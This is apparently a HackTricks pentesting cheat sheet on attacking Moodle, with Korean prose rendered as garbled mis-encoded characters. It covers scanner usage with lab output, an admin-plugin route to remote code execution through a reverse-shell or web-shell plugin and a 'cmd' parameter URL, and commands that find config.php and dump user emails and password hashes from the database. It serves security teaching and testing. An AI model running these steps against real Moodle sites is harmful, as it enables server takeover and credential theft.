# Moodle

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
{% endhint %}

<figure><img src="../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**Bug bounty tip**: **sign up** for **Intigriti**, a premium **bug bounty platform created by hackers, for hackers**! Join us at [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) today, and start earning bounties up to **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

## ìë™ ìŠ¤ìº”

### droopescan
```bash
pip3 install droopescan
droopescan scan moodle -u http://moodle.example.com/<moodle_path>/

[+] Plugins found:
forum http://moodle.schooled.htb/moodle/mod/forum/
http://moodle.schooled.htb/moodle/mod/forum/upgrade.txt
http://moodle.schooled.htb/moodle/mod/forum/version.php

[+] No themes found.

[+] Possible version(s):
3.10.0-beta

[+] Possible interesting urls found:
Static readme file. - http://moodle.schooled.htb/moodle/README.txt
Admin panel - http://moodle.schooled.htb/moodle/login/

[+] Scan finished (0:00:05.643539 elapsed)
```
### moodlescan
```bash
#Install from https://github.com/inc0d3/moodlescan
python3 moodlescan.py -k -u http://moodle.example.com/<moodle_path>/

Version 0.7 - Dic/2020
.............................................................................................................

By Victor Herrera - supported by www.incode.cl

.............................................................................................................

Getting server information http://moodle.schooled.htb/moodle/ ...

server         	: Apache/2.4.46 (FreeBSD) PHP/7.4.15
x-powered-by   	: PHP/7.4.15
x-frame-options	: sameorigin
last-modified  	: Wed, 07 Apr 2021 21:33:41 GMT

Getting moodle version...

Version found via /admin/tool/lp/tests/behat/course_competencies.feature : Moodle v3.9.0-beta

Searching vulnerabilities...


Vulnerabilities found: 0

Scan completed.
```
### CMSMap
```bash
pip3 install git+https://github.com/dionach/CMSmap.git
cmsmap http://moodle.example.com/<moodle_path>
```
### CVEs

ë‚˜ëŠ” ìë™ ë„êµ¬ê°€ **ë¬´ë“¤ ë²„ì „ì— ì˜í–¥ì„ ë¯¸ì¹˜ëŠ” ì·¨ì•½ì ì„ ì°¾ëŠ” ë° ê½¤ **ì“¸ëª¨ì—†ë‹¤ëŠ” ê²ƒì„ ë°œê²¬í–ˆë‹¤**. ë‹¹ì‹ ì€ **ë‹¤ìŒì—ì„œ í™•ì¸í•  ìˆ˜ ìˆë‹¤**: [**https://snyk.io/vuln/composer:moodle%2Fmoodle**](https://snyk.io/vuln/composer:moodle%2Fmoodle)

## **RCE**

ë‹¹ì‹ ì€ **ê´€ë¦¬ì** ì—­í• ì„ ê°€ì ¸ì•¼ í•˜ë©° **"ì‚¬ì´íŠ¸ ê´€ë¦¬"** íƒ­ ì•ˆì—ì„œ **í”ŒëŸ¬ê·¸ì¸ì„ ì„¤ì¹˜í•  ìˆ˜ ìˆë‹¤**\*\*:\*\*

![](<../../.gitbook/assets/image (630).png>)

ë‹¹ì‹ ì´ ê´€ë¦¬ìë¼ë©´ ì—¬ì „íˆ **ì´ ì˜µì…˜ì„ í™œì„±í™”í•´ì•¼ í•  ìˆ˜ë„ ìˆë‹¤**. ë¬´ë“¤ ê¶Œí•œ ìƒìŠ¹ PoCì—ì„œ ì–´ë–»ê²Œ í•˜ëŠ”ì§€ ë³¼ ìˆ˜ ìˆë‹¤: [https://github.com/HoangKien1020/CVE-2020-14321](https://github.com/HoangKien1020/CVE-2020-14321).

ê·¸ëŸ° ë‹¤ìŒ, **ë‹¤ìŒ í”ŒëŸ¬ê·¸ì¸ì„ ì„¤ì¹˜í•  ìˆ˜ ìˆë‹¤**. ì´ í”ŒëŸ¬ê·¸ì¸ì€ ê³ ì „ì ì¸ pentest-monkey php r**ev shell**ì„ í¬í•¨í•˜ê³  ìˆë‹¤ (_ì—…ë¡œë“œí•˜ê¸° ì „ì— ì••ì¶•ì„ í’€ê³ , revshellì˜ IPì™€ í¬íŠ¸ë¥¼ ë³€ê²½í•œ í›„ ë‹¤ì‹œ ì••ì¶•í•´ì•¼ í•œë‹¤_)

{% file src="../../.gitbook/assets/moodle-rce-plugin.zip" %}

ë˜ëŠ” [https://github.com/HoangKien1020/Moodle\_RCE](https://github.com/HoangKien1020/Moodle\_RCE)ì—ì„œ í”ŒëŸ¬ê·¸ì¸ì„ ì‚¬ìš©í•˜ì—¬ "cmd" ë§¤ê°œë³€ìˆ˜ë¥¼ ê°€ì§„ ì¼ë°˜ PHP ì…¸ì„ ì–»ì„ ìˆ˜ ìˆë‹¤.

ì•…ì„± í”ŒëŸ¬ê·¸ì¸ì„ ì‹¤í–‰í•˜ë ¤ë©´ ë‹¤ìŒì— ì ‘ê·¼í•´ì•¼ í•œë‹¤:
```bash
http://domain.com/<moodle_path>/blocks/rce/lang/en/block_rce.php?cmd=id
```
## POST

### ë°ì´í„°ë² ì´ìŠ¤ ìê²© ì¦ëª… ì°¾ê¸°
```bash
find / -name "config.php" 2>/dev/null | grep "moodle/config.php"
```
### ë°ì´í„°ë² ì´ìŠ¤ì—ì„œ ìê²© ì¦ëª… ë¤í”„í•˜ê¸°
```bash
/usr/local/bin/mysql -u <username> --password=<password> -e "use moodle; select email,username,password from mdl_user; exit"
```
<figure><img src="../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**ë²„ê·¸ ë°”ìš´í‹° íŒ**: **ê°€ì…í•˜ì„¸ìš”** **Intigriti**, í•´ì»¤ë¥¼ ìœ„í•´ í•´ì»¤ê°€ ë§Œë“  í”„ë¦¬ë¯¸ì—„ **ë²„ê·¸ ë°”ìš´í‹° í”Œë«í¼**! ì˜¤ëŠ˜ [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks)ì—ì„œ ì €í¬ì™€ í•¨ê»˜í•˜ê³  ìµœëŒ€ **$100,000**ì˜ ë³´ìƒì„ ë°›ê¸° ì‹œì‘í•˜ì„¸ìš”!

{% embed url="https://go.intigriti.com/hacktricks" %}
{% hint style="success" %}
AWS í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks ì§€ì›í•˜ê¸°</summary>

* [**êµ¬ë… ê³„íš**](https://github.com/sponsors/carlospolop) í™•ì¸í•˜ê¸°!
* **ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— ê°€ì…í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ë¥¼ íŒ”ë¡œìš°í•˜ì„¸ìš”.**
* **PRì„ ì œì¶œí•˜ì—¬ í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ í•˜ì„¸ìš”** [**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) ê¹ƒí—ˆë¸Œ ë¦¬í¬ì§€í† ë¦¬ì—.

</details>
{% endhint %}
</details>
{% endhint %}
